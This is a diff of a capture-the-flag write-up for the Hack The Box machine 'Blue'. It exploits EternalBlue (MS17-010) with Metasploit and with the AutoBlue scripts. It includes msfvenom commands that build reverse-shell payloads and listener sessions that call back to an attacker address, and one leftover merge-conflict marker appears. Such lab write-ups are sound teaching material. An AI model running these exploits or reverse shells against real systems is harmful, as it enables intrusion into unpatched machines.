@@ -1,4 +1,8 @@
+<<<<<<< HEAD
 #BLUE(Windows)
+=======
+# BLUE(Windows)
+>>>>>>> a5e8379674abbed031673c7ce9b624df932f14b4
 
 First we will enumerate this machine. This is a windows machine with SMB.
 
@@ -47,7 +51,7 @@ Nmap done: 1 IP address (1 host up) scanned in 107.87 seconds.
 ```
 We can see that there is Windows 7 Professional 6.1 on port 445. We can use smbclient, we run metasploit on it as well. A recent exploit on SMB is called eternal blue(ms17-010). I mean its in the name :p.
 
-##Method 1: Using Metasploit.
+## Method 1: Using Metasploit.
 
 Type this command in your terminal to open metasploit console.
 ```msfconsole```
@@ -175,7 +179,9 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.10.40
 rhosts => 10.10.10.40
 ```
 Now let it run. The above exploit can even be used on Windows 10. This exploit sometimes doesn't work on the first go. So, keep trying for more than one time.
-###Failed Attempt
+
+### Failed Attempt
+
 ```
 msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 
@@ -256,9 +262,13 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 [-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 [*] Exploit completed, but no session was created.
 ```
-Some of the reasons for above failure can be=>
--Using a Unstaged Payload.This is not the case here as we are using meterpreter reverse_tcp payload.
--lhost is not in the same network as the rhost. This is a rookie mistake. 
+Some of the reasons for above failure can be-
+
+- Using a Unstaged Payload.This is not the case here as we are using meterpreter reverse_tcp payload.
+
+- lhost is not in the same network as the rhost. This is a rookie mistake. 
+
+## Sucessful Attempt using Method 1.
 
 ```
 msf6 exploit(windows/smb/ms17_010_eternalblue) > options
@@ -342,3 +352,154 @@ Yes, we got the root access. So, we don't need to do any post privilege escalati
 You can check various commands allowed in the remote machine using ```help``` command.
 
 Now, you just have to navigate to desktop of both user and Admistrator and get the flag. I will not be posting the flag here.
+
+## Method 2: Using AutoBlue available on Github.
+
+You can easily get the python link by using this python script available on github.
+https://github.com/3ndG4me/AutoBlue-MS17-010
+
+You can read through the details on how to use it on the above page. It is very user friendly. 
+
+I have cloned the repo using 
+```
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+```
+Following the instructions given on the github page-
+```
+➜  AutoBlue-MS17-010 git:(master) ✗ python3 eternal_checker.py 10.10.10.40
+[*] Target OS: Windows 7 Professional 7601 Service Pack 1
+[!] The target is not patched
+=== Testing named pipes ===
+[*] Done
+```
+Basically Target not patched means that the target machine is vulnerable.
+```
+➜  AutoBlue-MS17-010 git:(master) ✗ ls                         
+eternalblue_exploit10.py  eternalblue_exploit8.py  LICENSE           mysmb.py   __pycache__  requirements.txt  zzz_exploit.py
+eternalblue_exploit7.py   eternal_checker.py       listener_prep.sh  mysmb.pyc  README.md    shellcode
+➜  AutoBlue-MS17-010 git:(master) ✗ cd shellcode 
+➜  shellcode git:(master) ✗ ./shell_prep.sh 
+                 _.-;;-._
+          '-..-'|   ||   |
+          '-..-'|_.-;;-._|
+          '-..-'|   ||   |
+          '-..-'|_.-''-._|   
+Eternal Blue Windows Shellcode Compiler
+
+Let's compile them windoos shellcodezzz
+
+Compiling x64 kernel shellcode
+Compiling x86 kernel shellcode
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
+Y
+LHOST for reverse connection:
+tun0
+LPORT you want x64 to listen on:
+4445
+LPORT you want x86 to listen on:
+4446
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+1
+Type 0 to generate a staged payload or 1 to generate a stageless payload
+0
+Generating x64 cmd shell (staged)...
+
+msfvenom -p windows/x64/shell/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=tun0 LPORT=4445
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 511 bytes
+Saved as: sc_x64_msf.bin
+
+Generating x86 cmd shell (staged)...
+
+msfvenom -p windows/shell/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=tun0 LPORT=4446
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 375 bytes
+Saved as: sc_x86_msf.bin
+
+MERGING SHELLCODE WOOOO!!!
+DONE
+```
+Now running setting up the listener shell
+```
+➜  AutoBlue-MS17-010 git:(master) ✗ ./listener_prep.sh 
+  __
+  /,-
+  ||)
+  \\_, )
+   `--'
+Enternal Blue Metasploit Listener
+
+LHOST for reverse connection:
+tun0
+LPORT for x64 reverse connection:
+4445
+LPORT for x86 reverse connection:
+4446
+Enter 0 for meterpreter shell or 1 for regular cmd shell:
+1
+Type 0 if this is a staged payload or 1 if it is for a stageless payload
+0
+Starting listener (staged)...
+Starting postgresql (via systemctl): postgresql.service.
+                                                  
+
+                 _---------.
+             .' #######   ;."
+  .---,.    ;@             @@`;   .---,..
+." @@@@@'.,'@@            @@@@@',.'@@@@ ".
+'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
+   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
+     "--'.@@@  -.@        @ ,'-   .'--"
+          ".@' ; @       @ `.  ;'
+            |@@@@ @@@     @    .
+             ' @@@ @@   @@    ,
+              `.@@@@    @@   .                                                                                                
+                ',@@     @   ;           _____________                                                                        
+                 (   3 C    )     /|___ / Metasploit! \                                                                       
+                 ;@'. __*__,."    \|--- \_____________/                                                                       
+                  '(.,...."/                                                                                                  
+
+
+       =[ metasploit v6.0.30-dev                          ]
++ -- --=[ 2099 exploits - 1129 auxiliary - 357 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Use help <command> to learn more 
+about any command
+
+[*] Processing config.rc for ERB directives.
+resource (config.rc)> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+resource (config.rc)> set PAYLOAD windows/x64/shell/reverse_tcp
+PAYLOAD => windows/x64/shell/reverse_tcp
+resource (config.rc)> set LHOST tun0
+LHOST => tun0
+resource (config.rc)> set LPORT 4445
+LPORT => 4445
+resource (config.rc)> set ExitOnSession false
+ExitOnSession => false
+resource (config.rc)> set EXITFUNC thread
+EXITFUNC => thread
+resource (config.rc)> exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+resource (config.rc)> set PAYLOAD windows/shell/reverse_tcp
+PAYLOAD => windows/shell/reverse_tcp
+resource (config.rc)> set LPORT 4446
+[*] Started reverse TCP handler on 10.10.14.3:4445 
+LPORT => 4446
+resource (config.rc)> exploit -j
+[*] Exploit running as background job 1.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.10.14.3:4446 
+msf6 exploit(multi/handler) > ➜  AutoBlue-MS17-010 git:(master) ✗ ./listener_prep.sh 
+```
+now run the python command as given in the instructions and you will get a shell session opened in the listener you setup.
+
